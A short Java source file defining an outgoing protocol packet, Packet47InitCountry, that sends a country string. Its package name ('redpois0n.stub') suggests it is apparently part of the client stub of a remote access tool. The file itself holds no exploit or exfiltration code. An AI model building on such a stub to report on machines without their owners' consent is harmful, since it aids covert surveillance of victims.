package com.redpois0n.stub.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet47InitCountry extends AbstractOutgoingPacket {
	
	private String country;
	
	public Packet47InitCountry(String country) {
		this.country = country;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(country);
	}

	@Override
	public byte getPacketId() {
		return (byte) 47;
	}
}